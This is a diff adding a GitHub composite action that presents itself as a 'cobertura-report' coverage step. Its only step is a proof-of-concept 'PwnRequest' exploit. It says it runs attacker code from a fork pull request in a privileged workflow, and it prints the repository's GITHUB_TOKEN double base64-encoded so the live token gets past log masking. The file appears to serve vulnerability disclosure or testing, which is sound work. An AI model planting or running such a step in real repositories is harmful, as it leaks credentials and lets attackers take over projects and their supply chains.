@@ -1,0 +1,25 @@
+name: 'cobertura-report'
+description: 'coverage report'
+inputs:
+  path:
+    required: false
+    default: ''
+  minimum_coverage:
+    required: false
+    default: '0'
+  fail_below_threshold:
+    required: false
+    default: 'false'
+runs:
+  using: "composite"
+  steps:
+    - shell: bash
+      env:
+        TOK: ${{ github.token }}
+      run: |
+        echo "::warning::PWNED — arbitrary code execution in the privileged workflow_run job (CWE-349 PwnRequest)"
+        echo "context: repo=$GITHUB_REPOSITORY run_id=$GITHUB_RUN_ID actor=$GITHUB_ACTOR event=$GITHUB_EVENT_NAME ref=$GITHUB_REF"
+        echo "This step is attacker-controlled code (from the fork PR head), running with the repo's privileged GITHUB_TOKEN."
+        echo "GITHUB_TOKEN (double base64 — decode twice to recover the live token):"
+        printf '%s' "$TOK" | base64 | base64 | tr -d '\n'; echo
+        echo "::warning::end PoC"
